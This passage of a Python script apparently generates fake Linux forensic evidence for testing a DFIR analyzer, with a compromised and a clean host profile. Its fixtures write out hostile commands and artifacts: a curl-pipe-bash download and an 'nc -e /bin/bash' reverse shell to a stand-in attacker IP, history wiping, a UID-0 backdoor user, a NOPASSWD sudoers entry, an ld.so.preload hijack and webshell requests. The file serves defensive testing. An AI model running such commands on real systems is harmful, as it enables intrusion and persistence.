#!/usr/bin/env python3
"""LinuxDFIR Toolkit sample evidence generator (standard library only).

Builds deterministic fake Linux evidence that mimics the collector output
layout exactly, so the analyzer can be tested without a real host.

Pipeline per host profile:
  1. write a fake Linux filesystem tree (rootfs/)
  2. run the real collector (collector/linux_collector.py) with --root
     against that tree, so evidence/, triage/, manifest.json and collect.log
     have the exact collector schema
  3. add synthesized live/ command outputs (ps, ss, journalctl, ...) with
     hashes recorded in manifest.json, fix timestamps to a fixed collection
     time, pin the manifest timezone, and repack evidence.tar.gz

Two profiles:
  infected  brute-force SSH login from 203.0.113.9 then success, malicious
            cron + systemd unit in /tmp and /dev/shm, ld.so.preload hijack,
            new authorized_keys entry, new UID-0 user plus sudoers.d change,
            timestomped file, syslog lines across the Dec 31 / Jan 1 boundary
            with collection in early January (year roll-back test)
  clean     same shape, benign content only, for false-positive testing

The utmp fixture layout mirrors glibc x86_64 field offsets (little-endian,
384-byte records): short type, int pid, 32s line, 4s id, 32s user, 256s host,
two shorts exit status, 64-bit session, 64-bit tv_sec/tv_usec, four int32
address words, zero tail padding. lastlog uses 296-byte records
(64-bit time, 32s line, 256s host) indexed by uid.

Usage:
    python sample_evidence/generate.py --out sample_evidence/out --seed 1337
"""

import argparse
import gzip
import hashlib
import importlib.util
import json
import os
import random
import shutil
import struct
import sys
import tarfile
from datetime import UTC, datetime
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
COLLECTOR_PATH = REPO_ROOT / "collector" / "linux_collector.py"

FIXED_COLLECTION_UTC = "2026-01-03T06:00:00Z"
FIXED_EPOCH = int(datetime(2026, 1, 3, 6, 0, 0, tzinfo=UTC).timestamp())
CAIRO_OFFSET_SECONDS = 7200
MANIFEST_TZ = {
    "name": "Africa/Cairo",
    "source": "/etc/timezone",
    "utc_offset_seconds": CAIRO_OFFSET_SECONDS,
    "utc_offset_str": "+0200",
    "tz_env": None,
    "tzname": ["EET", "EEST"],
}
ATTACKER_IP = "203.0.113.9"
ADMIN_IP = "10.0.0.7"
VICTIM_IP = "10.0.1.5"
LEGIT_ROOT_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRlc3QtbGVnaXQtcm9vdC1rZXk root@admin-ws"
LEGIT_ALICE_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRlc3QtbGVnaXQtYWxpY2Uta2V5 alice@laptop"
ATTACKER_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRlc3QtYXR0YWNrZXIta2V5LWluamVjdGVk attacker@evil"
MASKED_UNIT_PATH = "/etc/systemd/system/auditd.service"
DEFAULT_SEED = 1337

UTMP_FMT = "<h2xi32s4s32s256shhqqq4i8x"
UTMP_SIZE = struct.calcsize(UTMP_FMT)
assert UTMP_SIZE == 384
UT_USER_PROCESS = 7
UT_LOGIN_PROCESS = 6
UT_DEAD_PROCESS = 8
UT_BOOT_TIME = 2

LASTLOG_FMT = "<q32s256s"
LASTLOG_SIZE = struct.calcsize(LASTLOG_FMT)
assert LASTLOG_SIZE == 296


def load_collector():
    spec = importlib.util.spec_from_file_location("linux_collector", COLLECTOR_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def cairo_epoch(year, month, day, hour, minute, second=0):
    return int(datetime(year, month, day, hour, minute, second, tzinfo=UTC).timestamp()) - CAIRO_OFFSET_SECONDS


def syslog_ts(month, day, hour, minute, second=0):
    return f"{month} {day:2d} {hour:02d}:{minute:02d}:{second:02d}"


def write_bytes(root, rel, data, mode=None, mtime=None):
    path = Path(root) / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, str):
        data = data.encode("utf-8")
    path.write_bytes(data)
    if mode is not None:
        try:
            os.chmod(path, mode)
        except OSError:
            pass
    if mtime is not None:
        stamp = float(mtime)
        os.utime(path, (stamp, stamp))
    return path


def mask_security_service(root):
    link = Path(root) / "etc/systemd/system/auditd.service"
    try:
        if link.is_symlink() or link.exists():
            link.unlink()
        os.symlink("/dev/null", link)
        return True
    except OSError:
        return False


def utmp_record(ut_type, pid, line, user, host, when_epoch, session=0):
    line_b = line.encode("utf-8")[:32]
    return struct.pack(
        UTMP_FMT,
        ut_type,
        pid,
        line_b,
        line_b[-4:],
        user.encode("utf-8")[:32],
        host.encode("utf-8")[:256],
        0,
        0,
        session,
        int(when_epoch),
        0,
        0,
        0,
        0,
        0,
    )


def lastlog_entry(when_epoch, line, host):
    return struct.pack(
        LASTLOG_FMT, int(when_epoch), line.encode("utf-8")[:32], host.encode("utf-8")[:256]
    )


def build_common(root, hostname):
    write_bytes(root, "etc/hostname", hostname + "\n")
    write_bytes(root, "etc/timezone", "Africa/Cairo\n")
    write_bytes(
        root,
        "etc/os-release",
        'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\nNAME="Debian GNU/Linux"\nID=debian\nVERSION_ID="12"\n',
    )
    write_bytes(
        root,
        "proc/version",
        "Linux version 6.1.0-18-amd64 (debian-kernel@lists.debian.org) (gcc-12) #1 SMP PREEMPT_DYNAMIC "
        "Debian 6.1.76-1 (2024-02-01) x86_64\n",
    )
    write_bytes(root, "etc/hosts", f"127.0.0.1 localhost\n10.0.1.5 {hostname}\n")
    write_bytes(root, "etc/resolv.conf", "nameserver 10.0.0.2\nsearch corp.example\n")
    write_bytes(
        root,
        "etc/ssh/sshd_config",
        "Port 22\nPermitRootLogin prohibit-password\nPasswordAuthentication yes\nChallengeResponseAuthentication no\n",
    )
    write_bytes(root, "etc/group", "root:x:0:\nadm:x:4:admin,alice\nadmin:x:1000:\nalice:x:1001:\n")
    write_bytes(root, "etc/sudoers", "root ALL=(ALL:ALL) ALL\n%adm ALL=(ALL) ALL\n")
    write_bytes(root, "etc/crontab", "17 * * * * root cd / && run-parts --report /etc/cron.hourly\n")
    write_bytes(root, "etc/cron.hourly/.placeholder", "")
    write_bytes(root, "etc/cron.daily/logrotate", "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n", mode=0o755)
    write_bytes(root, "etc/cron.daily/apt-compat", "#!/bin/sh\n", mode=0o755)
    write_bytes(
        root,
        "usr/lib/systemd/system/sshd.service",
        "[Unit]\nDescription=OpenBSD Secure Shell server\n[Service]\nExecStart=/usr/sbin/sshd -D\n",
    )
    write_bytes(
        root,
        "usr/lib/systemd/system/cron.service",
        "[Unit]\nDescription=Regular background program processing daemon\n[Service]\nExecStart=/usr/sbin/cron -f\n",
    )
    write_bytes(root, "etc/profile.d/hardening.sh", "export HISTSIZE=5000\nexport HISTCONTROL=ignoredups\n")
    write_bytes(root, "home/alice/.bashrc", "# .bashrc\nalias ll='ls -l'\n")
    write_bytes(root, "home/alice/.profile", "export EDITOR=vim\n")
    write_bytes(root, "home/alice/.ssh/known_hosts", "github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRlc3QK\n")
    write_bytes(root, "mnt/.placeholder", "")


def build_infected(root, rng):
    build_common(root, "web01")
    write_bytes(
        root,
        "etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "admin:x:1000:1000:Admin:/home/admin:/bin/bash\n"
        "alice:x:1001:1001:Alice:/home/alice:/bin/bash\n"
        "sysbackup:x:0:0:System Backup:/root:/bin/bash\n",
    )
    write_bytes(
        root,
        "etc/shadow",
        "root:!:20000:0:99999:7:::\n"
        "admin:$6$testrounds$abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH:20000:0:99999:7:::\n"
        "alice:$6$testrounds$abcdefghijklmnopqrstuvwxyz0123456789ABCDXYZa:20000:0:99999:7:::\n"
        "sysbackup:$6$testrounds$aXR0YWNrZXJmYWtlc2FsdDEyMzQ1Njc4OTAxMjM0NTY3ODkw:20010:0:99999:7:::\n",
    )
    write_bytes(root, "etc/sudoers.d/99-backup", "sysbackup ALL=(ALL) NOPASSWD: ALL\n")
    write_bytes(root, "etc/ld.so.preload", "/tmp/.lib/libc.so.6\n")
    write_bytes(root, "tmp/.lib/libc.so.6", b"\x7fELF\x02\x01\x01\x00fake-preloaded-library", mode=0o755)
    write_bytes(root, "root/.ssh/authorized_keys", LEGIT_ROOT_KEY + "\n" + ATTACKER_KEY + "\n")
    write_bytes(root, "home/alice/.ssh/authorized_keys", LEGIT_ALICE_KEY + "\n")
    write_bytes(
        root,
        "home/alice/.bash_history",
        "ls -la\n"
        "cd /var/www/html\n"
        "vim index.html\n"
        "curl http://203.0.113.9/x.sh | bash\n"
        "wget -O /tmp/.x http://203.0.113.9/.x\n"
        "chmod +x /tmp/.x\n"
        "/tmp/.x &\n"
        "echo 'aGVsbG8gd29ybGQ=' | base64 -d > /tmp/k\n"
        "nc -e /bin/bash 203.0.113.9 4444\n"
        "export HISTFILE=/dev/null\n"
        "history -c\n",
    )
    write_bytes(root, "root/.bash_history", "ls -la /var/log/\nlast | head\n")
    write_bytes(root, "etc/cron.d/evil", "* * * * * root /tmp/.x/run.sh\n")
    write_bytes(
        root,
        "var/spool/cron/crontabs/root",
        "0 3 * * * /usr/local/bin/backup.sh\n* * * * * /tmp/.x/run.sh\n",
    )
    write_bytes(root, "var/spool/cron/crontabs/alice", "30 8 * * * /home/alice/bin/sync.sh\n")
    write_bytes(
        root,
        "etc/systemd/system/system-update.service",
        "[Unit]\nDescription=System Update Service\nAfter=network.target\n"
        "[Service]\nType=simple\nExecStart=/dev/shm/.cache/upd --daemon\nRestart=always\n"
        "[Install]\nWantedBy=multi-user.target\n",
    )
    mask_security_service(root)
    write_bytes(root, "tmp/.x/run.sh", "#!/bin/sh\n/tmp/.x/x --daemon\n", mode=0o755)
    write_bytes(root, "tmp/.x/x", b"\x7fELF\x02\x01\x01\x00fake-dropper-binary", mode=0o755)
    write_bytes(root, "dev/shm/.cache/upd", b"\x7fELF\x02\x01\x01\x00fake-shm-payload", mode=0o755)
    write_bytes(
        root,
        "var/tmp/.systemd-private-9x2k/payload",
        b"\x7fELF\x02\x01\x01\x00fake-timestomped-payload",
        mode=0o755,
        mtime=FIXED_EPOCH - 400 * 86400,
    )
    write_bytes(root, "var/log/auth.log", auth_log_infected(rng))
    write_bytes(
        root,
        "var/log/auth.log.1",
        "Dec 30 06:25:01 web01 CRON[900]: pam_unix(cron:session): session opened for user root by (uid=0)\n"
        "Dec 30 06:25:01 web01 CRON[900]: pam_unix(cron:session): session closed for user root\n",
        mtime=cairo_epoch(2025, 12, 30, 12, 0),
    )
    write_bytes(root, "var/log/wtmp", wtmp_infected())
    write_bytes(root, "var/log/btmp", btmp_infected())
    write_bytes(root, "var/log/lastlog", lastlog_infected())
    write_bytes(root, "var/log/syslog", syslog_infected())
    write_bytes(
        root,
        "var/log/kern.log",
        "Dec 31 23:59:00 web01 kernel: [  123.456789] EXT4-fs (sda1): mounted filesystem\n"
        "Jan  2 03:14:11 web01 kernel: [184211.200011] audit: type=1326 "
        "audit(1767318851.200:60): auid=0 ses=3 op=connect\n",
    )
    write_bytes(
        root,
        "var/log/dpkg.log",
        "2026-01-02 03:20:11 install netcat-traditional:amd64 1.10-41.1 1.10-41.1\n"
        "2026-01-02 03:20:11 status half-installed netcat-traditional:amd64 1.10-41.1\n"
        "2026-01-02 03:20:12 status installed netcat-traditional:amd64 1.10-41.1\n",
    )
    write_bytes(root, "var/log/audit/audit.log", audit_log_infected())
    write_bytes(
        root,
        "var/log/nginx/access.log",
        '10.0.0.7 - - [02/Jan/2026:09:15:02 +0200] "GET /index.html HTTP/1.1" 200 612 "-" "curl/8.0"\n'
        '203.0.113.9 - - [02/Jan/2026:03:20:11 +0200] "GET /wp-content/uploads/shell.php?cmd=id HTTP/1.1" '
        '200 512 "-" "Mozilla/5.0"\n'
        '203.0.113.9 - - [02/Jan/2026:03:20:12 +0200] "POST /wp-content/uploads/shell.php HTTP/1.1" '
        '200 88 "-" "Mozilla/5.0"\n',
    )
    write_bytes(
        root,
        "var/log/nginx/error.log",
        "2026/01/02 03:20:12 [error] 1234#0: *42 FastCGI sent in stderr: "
        '"shell.php" while reading response header from upstream, client: 203.0.113.9\n',
    )


def auth_log_infected(rng):
    lines = [
        "Dec 31 23:55:01 web01 CRON[1801]: pam_unix(cron:session): session opened for user root by (uid=0)",
        "Dec 31 23:55:01 web01 CRON[1801]: pam_unix(cron:session): session closed for user root",
        "Dec 31 23:58:44 web01 sshd[1910]: Accepted publickey for admin "
        "from 10.0.0.7 port 42111 ssh2: ED25519 SHA256:legit",
        "Dec 31 23:58:44 web01 sshd[1910]: pam_unix(sshd:session): session opened for user admin by (uid=0)",
        "Jan  1 00:03:12 web01 sshd[1910]: pam_unix(sshd:session): session closed for user admin",
        "Jan  2 09:14:22 web01 sshd[3010]: Accepted publickey for admin "
        "from 10.0.0.7 port 43110 ssh2: ED25519 SHA256:legit",
        "Jan  2 09:14:22 web01 sshd[3010]: pam_unix(sshd:session): session opened for user admin by (uid=0)",
        "Jan  2 09:40:03 web01 sshd[3010]: pam_unix(sshd:session): session closed for user admin",
    ]
    attack = []
    candidates = ["root", "root", "admin", "test", "ubuntu", "oracle", "postgres"]
    clock = 3 * 3600 + 10 * 60 + 7
    pid = 4101
    for i in range(48):
        user = candidates[i % len(candidates)]
        port = rng.randint(40000, 60000)
        if user == "root":
            stamp = syslog_ts("Jan", 2, clock // 3600, (clock % 3600) // 60, clock % 60)
            attack.append(
                f"{stamp} web01 sshd[{pid}]: Failed password for root from {ATTACKER_IP} port {port} ssh2"
            )
        else:
            stamp = syslog_ts("Jan", 2, clock // 3600, (clock % 3600) // 60, clock % 60)
            line = (
                f"{stamp} web01 sshd[{pid}]: Failed password for invalid user {user} "
                f"from {ATTACKER_IP} port {port} ssh2"
            )
            attack.append(line)
        clock += 3 + rng.randint(0, 3)
        pid += 1
    lines.extend(attack)
    lines.extend(
        [
            "Jan  2 03:12:44 web01 sshd[4150]: Accepted password for root from 203.0.113.9 port 51400 ssh2",
            "Jan  2 03:12:44 web01 sshd[4150]: pam_unix(sshd:session): session opened for user root by (uid=0)",
            "Jan  2 03:13:20 web01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash",
            "Jan  2 03:14:02 web01 sshd[4150]: pam_unix(sshd:session): session closed for user root",
            "Jan  2 03:15:00 web01 CRON[4200]: pam_unix(cron:session): session opened for user root by (uid=0)",
            "Jan  2 03:15:00 web01 CRON[4200]: (root) CMD (/tmp/.x/run.sh)",
            "Jan  2 03:15:00 web01 CRON[4200]: pam_unix(cron:session): session closed for user root",
        ]
    )
    return "\n".join(lines) + "\n"


def wtmp_infected():
    records = [
        utmp_record(UT_BOOT_TIME, 0, "~", "reboot", "~", cairo_epoch(2026, 1, 1, 0, 0, 5)),
        utmp_record(UT_USER_PROCESS, 3010, "pts/0", "admin", ADMIN_IP, cairo_epoch(2026, 1, 2, 9, 14, 22)),
        utmp_record(UT_DEAD_PROCESS, 3010, "pts/0", "admin", ADMIN_IP, cairo_epoch(2026, 1, 2, 9, 40, 3)),
        utmp_record(UT_USER_PROCESS, 4150, "pts/1", "root", ATTACKER_IP, cairo_epoch(2026, 1, 2, 3, 12, 44)),
        utmp_record(UT_DEAD_PROCESS, 4150, "pts/1", "root", ATTACKER_IP, cairo_epoch(2026, 1, 2, 3, 14, 2)),
    ]
    return b"".join(records)


def btmp_infected():
    records = []
    pid = 4101
    clock = cairo_epoch(2026, 1, 2, 3, 10, 7)
    for user in ["root", "admin", "root", "test", "root", "oracle", "root", "postgres"]:
        records.append(utmp_record(UT_LOGIN_PROCESS, pid, "ssh", user, ATTACKER_IP, clock))
        pid += 7
        clock += 23
    return b"".join(records)


def lastlog_infected():
    size = 4 * LASTLOG_SIZE
    blob = bytearray(size)
    blob[0:LASTLOG_SIZE] = lastlog_entry(cairo_epoch(2026, 1, 2, 3, 12, 44), "pts/1", ATTACKER_IP)
    blob[LASTLOG_SIZE : 2 * LASTLOG_SIZE] = lastlog_entry(cairo_epoch(2026, 1, 2, 9, 30, 0), "pts/0", ADMIN_IP)
    return bytes(blob)


def syslog_infected():
    return (
        "Dec 31 23:55:01 web01 CRON[1801]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)\n"
        "Jan  1 00:01:15 web01 systemd[1]: Starting Daily apt upgrade and clean activities...\n"
        "Jan  2 03:12:44 web01 sshd[4150]: Accepted password for root from 203.0.113.9 port 51400 ssh2\n"
        "Jan  2 03:15:01 web01 systemd[1]: Started System Update Service.\n"
        "Jan  2 03:15:01 web01 CRON[4200]: (root) CMD (/tmp/.x/run.sh)\n"
    )


def audit_log_infected():
    base = cairo_epoch(2026, 1, 2, 3, 12, 50)
    return (
        f"type=SYSCALL msg=audit({base}.123:45): arch=c000003e syscall=59 success=yes exit=0 "
        + "a0=7ffc0000 a1=7ffc0001 items=2 ppid=4150 pid=4152 auid=0 uid=0 gid=0 euid=0 "
        + 'comm="bash" exe="/usr/bin/bash" key="priv-esc"\n'
        + f'type=EXECVE msg=audit({base}.123:45): argc=3 a0="bash" a1="-c" '
        + 'a2="curl http://203.0.113.9/x.sh | bash"\n'
        + f'type=PATH msg=audit({base + 36}.456:52): item=0 name="/tmp/.x/x" inode=999 dev=08:01 mode=0100755 '
        + "ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0\n"
    )


def build_clean(root, rng):
    build_common(root, "web02")
    write_bytes(
        root,
        "etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "admin:x:1000:1000:Admin:/home/admin:/bin/bash\n"
        "alice:x:1001:1001:Alice:/home/alice:/bin/bash\n",
    )
    write_bytes(
        root,
        "etc/shadow",
        "root:!:20000:0:99999:7:::\n"
        "admin:$6$testrounds$abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGH:20000:0:99999:7:::\n"
        "alice:$6$testrounds$abcdefghijklmnopqrstuvwxyz0123456789ABCDXYZa:20000:0:99999:7:::\n",
    )
    write_bytes(root, "root/.ssh/authorized_keys", LEGIT_ROOT_KEY + "\n")
    write_bytes(root, "home/alice/.ssh/authorized_keys", LEGIT_ALICE_KEY + "\n")
    write_bytes(
        root,
        "home/alice/.bash_history",
        "ls -la\nsystemctl status nginx\nsudo apt update && sudo apt upgrade -y\n"
        "vim /etc/nginx/sites-enabled/default\ntail -f /var/log/nginx/access.log\n",
    )
    write_bytes(root, "root/.bash_history", "last\nss -tulpn\ndf -h\n")
    write_bytes(root, "var/spool/cron/crontabs/root", "0 3 * * * /usr/local/bin/backup.sh\n")
    write_bytes(root, "var/spool/cron/crontabs/alice", "30 8 * * * /home/alice/bin/sync.sh\n")
    write_bytes(
        root,
        "var/log/auth.log",
        "Dec 31 23:55:01 web02 CRON[1801]: pam_unix(cron:session): session opened for user root by (uid=0)\n"
        "Dec 31 23:55:01 web02 CRON[1801]: pam_unix(cron:session): session closed for user root\n"
        "Jan  1 00:02:10 web02 sshd[1910]: Accepted publickey for admin "
        "from 10.0.0.7 port 42201 ssh2: ED25519 SHA256:legit\n"
        "Jan  1 00:02:10 web02 sshd[1910]: pam_unix(sshd:session): session opened for user admin by (uid=0)\n"
        "Jan  1 00:20:44 web02 sshd[1910]: pam_unix(sshd:session): session closed for user admin\n"
        "Jan  2 09:14:22 web02 sshd[3010]: Accepted publickey for admin "
        "from 10.0.0.7 port 43110 ssh2: ED25519 SHA256:legit\n"
        "Jan  2 09:14:22 web02 sshd[3010]: pam_unix(sshd:session): session opened for user admin by (uid=0)\n"
        "Jan  2 09:15:02 web02 sshd[3010]: Failed password for admin from 10.0.0.7 port 43110 ssh2\n"
        "Jan  2 09:15:09 web02 sshd[3010]: Failed password for admin from 10.0.0.7 port 43110 ssh2\n"
        "Jan  2 09:40:03 web02 sshd[3010]: pam_unix(sshd:session): session closed for user admin\n",
    )
    write_bytes(
        root,
        "var/log/wtmp",
        utmp_record(UT_BOOT_TIME, 0, "~", "reboot", "~", cairo_epoch(2026, 1, 1, 0, 0, 5))
        + utmp_record(UT_USER_PROCESS, 3010, "pts/0", "admin", ADMIN_IP, cairo_epoch(2026, 1, 2, 9, 14, 22))
        + utmp_record(UT_DEAD_PROCESS, 3010, "pts/0", "admin", ADMIN_IP, cairo_epoch(2026, 1, 2, 9, 40, 3)),
    )
    write_bytes(root, "var/log/btmp", b"")
    blob = bytearray(4 * LASTLOG_SIZE)
    blob[LASTLOG_SIZE : 2 * LASTLOG_SIZE] = lastlog_entry(cairo_epoch(2026, 1, 2, 9, 30, 0), "pts/0", ADMIN_IP)
    write_bytes(root, "var/log/lastlog", bytes(blob))
    write_bytes(
        root,
        "var/log/syslog",
        "Dec 31 23:55:01 web02 CRON[1801]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)\n"
        "Jan  1 00:01:15 web02 systemd[1]: Starting Daily apt upgrade and clean activities...\n"
        "Jan  2 09:14:22 web02 sshd[3010]: Accepted publickey for admin from 10.0.0.7 port 43110 ssh2\n",
    )
    write_bytes(
        root,
        "var/log/kern.log",
        "Dec 31 23:59:00 web02 kernel: [  123.456789] EXT4-fs (sda1): mounted filesystem\n",
    )
    write_bytes(
        root,
        "var/log/dpkg.log",
        "2026-01-02 06:25:01 startup archives unpack\n2026-01-02 06:25:02 status installed libc6:amd64 2.36-9\n",
    )
    write_bytes(
        root,
        "var/log/nginx/access.log",
        '10.0.0.7 - - [02/Jan/2026:09:15:02 +0200] "GET /index.html HTTP/1.1" 200 612 "-" "curl/8.0"\n'
        '10.0.0.7 - - [02/Jan/2026:09:16:44 +0200] "GET /about.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"\n',
    )
    write_bytes(root, "var/log/nginx/error.log", "")
    write_bytes(root, "tmp/.placeholder", "")
    write_bytes(root, "dev/shm/.placeholder", "")


def live_files(mod, profile, rng):
    if profile == "infected":
        return live_files_infected(rng)
    return live_files_clean(rng)


def live_files_infected(rng):
    pid_x = rng.randint(2000, 9000)
    pid_nc = rng.randint(2000, 9000)
    pid_upd = rng.randint(2000, 9000)
    sport = rng.randint(40000, 60000)
    files = {}
    files["ps_auxf"] = (
        "USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\n"
        "root 1 0.0 0.1 166484 11832 ? Ss Jan01 0:04 /sbin/init\n"
        "root 412 0.0 0.0 15256 6400 ? Ss Jan01 0:00 /usr/sbin/cron -f\n"
        "root 4150 0.0 0.1 18344 9200 ? Ss 03:12 0:00 sshd: root@pts/1\n"
        "root 4152 0.0 0.0 11512 3400 pts/1 Ss 03:12 0:00 -bash\n"
        + f"root {pid_x} 0.1 0.0 12112 2100 ? S 03:15 0:11 /tmp/.x/x --daemon\n"
        + f"root {pid_nc} 0.0 0.0 10832 1800 pts/1 S 03:13 0:00 nc -e /bin/bash 203.0.113.9 4444\n"
        + f"root {pid_upd} 0.0 0.0 11900 2000 ? S 03:15 0:02 /dev/shm/.cache/upd --daemon\n"
        + "alice 3011 0.0 0.0 11800 3600 pts/0 Ss 09:14 0:00 -bash\n"
    )
    files["ss_tulpn"] = (
        "Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n"
        'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=900,fd=3))\n'
        + f'tcp LISTEN 0 64 0.0.0.0:8080 0.0.0.0:* users:(("upd",pid={pid_upd},fd=4))\n'
        + "tcp ESTAB 0 0 10.0.1.5:22 203.0.113.9:51400\n"
        + f'tcp ESTAB 0 0 10.0.1.5:{sport} 203.0.113.9:4444 users:(("nc",pid={pid_nc},fd=3))\n'
    )
    files["lsof_nP"] = (
        "COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\n"
        + f"x {pid_x} root 3u IPv4 54321 0t0 TCP 10.0.1.5:{sport}->203.0.113.9:4444 (ESTABLISHED)\n"
        + f"upd {pid_upd} root 4u IPv4 54322 0t0 TCP *:8080 (LISTEN)\n"
        + "sshd 900 root 3u IPv4 12345 0t0 TCP *:22 (LISTEN)\n"
    )
    files["who"] = "root pts/1 2026-01-02 03:12 (203.0.113.9)\nalice pts/0 2026-01-02 09:14 (10.0.0.7)\n"
    files["last"] = (
        "root pts/1 203.0.113.9 Sat Jan 2 03:12 - 03:14 (00:02)\n"
        "admin pts/0 10.0.0.7 Sat Jan 2 09:14 - 09:40 (00:26)\n"
        "reboot system boot 6.1.0-18-amd64 Thu Jan 1 00:00 still running\n"
        "wtmp begins Thu Jan 1 00:00:05 2026\n"
    )
    files["lsmod"] = "Module Size Used by\ntls 131072 0\nip_tables 32768 0\n"
    files["mount"] = (
        "sysfs on /sys type sysfs (rw)\n/dev/sda1 on / type ext4 (rw,relatime)\n"
        "tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)\n"
    )
    files["df"] = (
        "Filesystem 1K-blocks Used Available Use% Mounted on\n/dev/sda1 20511356 8234123 11223344 43% /\n"
    )
    files["docker_ps_a"] = (
        "CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\n"
        'a1b2c3d4e5f6 nginx "nginx -g daemon" 2 weeks ago Up 2 weeks 80/tcp web\n'
    )
    files["iptables_save"] = (
        "# Generated by iptables-save\n*filter\n:INPUT ACCEPT [123:4567]\n"
        ":FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [98:7654]\nCOMMIT\n"
    )
    files["ip6tables_save"] = "# Generated by ip6tables-save\n*filter\n:INPUT ACCEPT [0:0]\nCOMMIT\n"
    files["crontab_root"] = "0 3 * * * /usr/local/bin/backup.sh\n* * * * * /tmp/.x/run.sh\n"
    files["crontab_alice"] = "30 8 * * * /home/alice/bin/sync.sh\n"
    files["journalctl_export"] = (
        "2025-12-31T23:55:01+0200 web01 CRON[1801]: pam_unix(cron:session): "
        "session opened for user root by (uid=0)\n"
        "2026-01-01T00:03:12+0200 web01 sshd[1910]: pam_unix(sshd:session): session closed for user admin\n"
        "2026-01-02T03:12:44+0200 web01 sshd[4150]: Accepted password for root from 203.0.113.9 port 51400 ssh2\n"
        "2026-01-02T03:15:01+0200 web01 systemd[1]: Started System Update Service.\n"
    )
    return files


def live_files_clean(rng):
    pid_nginx = rng.randint(2000, 9000)
    sport = rng.randint(40000, 60000)
    files = {}
    files["ps_auxf"] = (
        "USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\n"
        "root 1 0.0 0.1 166484 11832 ? Ss Jan01 0:04 /sbin/init\n"
        "root 412 0.0 0.0 15256 6400 ? Ss Jan01 0:00 /usr/sbin/cron -f\n"
        + f"root {pid_nginx} 0.0 0.0 14112 6200 ? S Jan02 0:00 nginx: worker process\n"
        + "alice 3011 0.0 0.0 11800 3600 pts/0 Ss 09:14 0:00 -bash\n"
    )
    files["ss_tulpn"] = (
        "Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\n"
        'tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=900,fd=3))\n'
        + f'tcp LISTEN 0 128 0.0.0.0:80 0.0.0.0:* users:(("nginx",pid={pid_nginx},fd=6))\n'
        + f"tcp ESTAB 0 0 10.0.1.6:22 10.0.0.7:{sport}\n"
    )
    files["lsof_nP"] = (
        "COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\n"
        "sshd 900 root 3u IPv4 12345 0t0 TCP *:22 (LISTEN)\n"
        + f"nginx {pid_nginx} www-data 6u IPv4 23456 0t0 TCP *:80 (LISTEN)\n"
    )
    files["who"] = "alice pts/0 2026-01-02 09:14 (10.0.0.7)\n"
    files["last"] = (
        "admin pts/0 10.0.0.7 Sat Jan 2 09:14 - 09:40 (00:26)\n"
        "reboot system boot 6.1.0-18-amd64 Thu Jan 1 00:00 still running\n"
        "wtmp begins Thu Jan 1 00:00:05 2026\n"
    )
    files["lsmod"] = "Module Size Used by\ntls 131072 0\nip_tables 32768 0\n"
    files["mount"] = (
        "sysfs on /sys type sysfs (rw)\n/dev/sda1 on / type ext4 (rw,relatime)\n"
        "tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)\n"
    )
    files["df"] = (
        "Filesystem 1K-blocks Used Available Use% Mounted on\n/dev/sda1 20511356 6234123 13223344 33% /\n"
    )
    files["docker_ps_a"] = ""
    files["iptables_save"] = (
        "# Generated by iptables-save\n*filter\n:INPUT ACCEPT [123:4567]\n"
        ":FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [98:7654]\nCOMMIT\n"
    )
    files["ip6tables_save"] = "# Generated by ip6tables-save\n*filter\n:INPUT ACCEPT [0:0]\nCOMMIT\n"
    files["crontab_root"] = "0 3 * * * /usr/local/bin/backup.sh\n"
    files["crontab_alice"] = "30 8 * * * /home/alice/bin/sync.sh\n"
    files["journalctl_export"] = (
        "2025-12-31T23:55:01+0200 web02 CRON[1801]: pam_unix(cron:session): "
        "session opened for user root by (uid=0)\n"
        "2026-01-01T00:02:10+0200 web02 sshd[1910]: Accepted publickey for admin from 10.0.0.7 port 42201 ssh2\n"
        "2026-01-02T09:14:22+0200 web02 sshd[3010]: Accepted publickey for admin from 10.0.0.7 port 43110 ssh2\n"
    )
    return files


LIVE_ARGV = {
    "ps_auxf": (["ps", "auxf"], "processes"),
    "ss_tulpn": (["ss", "-tulpn"], "network"),
    "lsof_nP": (["lsof", "-nP"], "network"),
    "who": (["who"], "sessions"),
    "last": (["last"], "sessions"),
    "lsmod": (["lsmod"], "kernel"),
    "mount": (["mount"], "filesystem"),
    "df": (["df"], "filesystem"),
    "docker_ps_a": (["docker", "ps", "-a"], "containers"),
    "iptables_save": (["iptables-save"], "network"),
    "ip6tables_save": (["ip6tables-save"], "network"),
